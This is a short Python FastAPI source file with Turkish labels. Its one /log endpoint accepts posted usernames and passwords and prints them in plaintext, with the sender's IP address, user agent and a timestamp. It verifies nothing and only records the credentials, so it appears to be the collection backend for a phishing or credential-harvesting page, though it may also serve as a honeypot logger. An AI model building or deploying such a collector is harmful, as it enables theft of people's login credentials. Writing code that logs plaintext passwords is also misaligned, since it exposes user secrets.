from fastapi import FastAPI, Request
from rich.console import Console
from rich.table import Table
from datetime import datetime

app = FastAPI()
console = Console()

@app.post("/log")
async def log_data(req: Request):
    data = await req.json()
    ip = req.client.host
    ua = req.headers.get("user-agent", "unknown")

    username = data.get("username", "-")
    password = data.get("password", "-")

    table = Table(title="🔐 Güvenlik Giriş Logu", show_lines=True)
    table.add_column("Alan", style="cyan", no_wrap=True)
    table.add_column("Değer", style="white")

    table.add_row("IP", ip)
    table.add_row("User-Agent", ua)
    table.add_row("Kullanıcı Adı", username)
    table.add_row("Şifre", password)
    table.add_row("Zaman", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    console.print(table)
    return {"status": "ok"}
